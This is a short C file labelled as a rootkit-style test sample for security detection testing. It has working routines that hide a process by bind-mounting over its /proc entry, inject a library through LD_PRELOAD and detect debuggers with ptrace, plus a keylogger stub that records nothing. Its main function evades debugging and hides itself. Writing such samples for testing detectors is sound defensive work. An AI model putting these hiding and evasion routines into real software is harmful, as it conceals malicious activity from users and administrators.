/*
 * [TEST SAMPLE] Rootkit-style Loader - FOR SECURITY TESTING ONLY
 * Contains typical rootkit function signatures for detection testing
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/ptrace.h>
#include <dlfcn.h>

/* Hide process from /proc listing */
void hide_process(pid_t pid) {
    char cmd[256];
    snprintf(cmd, sizeof(cmd), "mount -o bind /tmp /proc/%d", pid);
    system(cmd);
}

/* LD_PRELOAD injection for library hijacking */
void inject_library(const char *target, const char *lib) {
    setenv("LD_PRELOAD", lib, 1);
    execl(target, target, NULL);
}

/* Anti-debugging check */
int detect_debugger(void) {
    return ptrace(PTRACE_TRACEME, 0, NULL, NULL) == -1;
}

/* Keylogger stub */
void start_keylogger(const char *logfile) {
    FILE *fp = fopen(logfile, "a");
    /* Would hook keyboard input device /dev/input/event* */
    fclose(fp);
}

int main(void) {
    if (detect_debugger()) return 1;
    hide_process(getpid());
    return 0;
}
